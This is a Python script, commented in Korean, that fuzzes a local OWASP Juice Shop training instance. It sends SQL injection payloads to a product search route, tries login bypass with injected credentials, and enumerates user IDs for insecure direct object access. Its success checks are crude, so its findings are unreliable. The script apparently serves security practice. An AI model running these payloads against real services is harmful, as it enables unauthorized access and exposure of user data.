#!/usr/bin/env python3
"""
API Fuzzing Tool - 자동 취약점 탐색
"""
import requests
import json
from datetime import datetime

class APIFuzzer:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def fuzz_sql_injection(self, endpoint):
        """SQL Injection 자동 테스트"""
        print(f"\n🎯 SQL Injection 테스트: {endpoint}")
        
        payloads = [
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "1' UNION SELECT NULL--",
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    f"{self.base_url}{endpoint}",
                    params={"q": payload},
                    timeout=3
                )
                
                if response.status_code == 200:
                    if "error" in response.text.lower() or "sql" in response.text.lower():
                        print(f"  ⚠️  취약점 가능: {payload}")
                    else:
                        print(f"  ✅ 안전: {payload}")
            except:
                pass
    
    def fuzz_authentication(self, login_endpoint):
        """인증 우회 테스트"""
        print(f"\n🔐 인증 우회 테스트: {login_endpoint}")
        
        test_cases = [
            {"email": "' OR 1=1--", "password": "test"},
            {"email": "admin'--", "password": ""},
            {"email": "admin@test.com", "password": "' OR '1'='1"},
        ]
        
        for case in test_cases:
            try:
                response = self.session.post(
                    f"{self.base_url}{login_endpoint}",
                    json=case,
                    timeout=3
                )
                
                if response.status_code == 200:
                    print(f"  ⚠️  우회 성공: {case['email']}")
                else:
                    print(f"  ✅ 차단됨: {case['email']}")
            except:
                pass
    
    def fuzz_idor(self, endpoint, id_range=10):
        """IDOR/BOLA 취약점 테스트"""
        print(f"\n🔓 IDOR 테스트: {endpoint}")
        
        for user_id in range(1, id_range + 1):
            try:
                url = f"{self.base_url}{endpoint}/{user_id}"
                response = self.session.get(url, timeout=3)
                
                if response.status_code == 200:
                    print(f"  📂 접근 가능: ID {user_id}")
                elif response.status_code == 401:
                    print(f"  🔒 인증 필요: ID {user_id}")
            except:
                pass

def main():
    print("""
╔════════════════════════════════════════════════════════════╗
║              🔥 API Fuzzing Tool v1.0                     ║
╚════════════════════════════════════════════════════════════╝
    """)
    
    # Juice Shop 테스트
    fuzzer = APIFuzzer("http://localhost:3000")
    
    print("\n[1] SQL Injection 퍼징")
    print("=" * 60)
    fuzzer.fuzz_sql_injection("/rest/products/search")
    
    print("\n[2] 인증 우회 퍼징")
    print("=" * 60)
    fuzzer.fuzz_authentication("/rest/user/login")
    
    print("\n[3] IDOR 퍼징")
    print("=" * 60)
    fuzzer.fuzz_idor("/api/users", 5)
    
    print("\n✅ 퍼징 완료!")

if __name__ == "__main__":
    main()
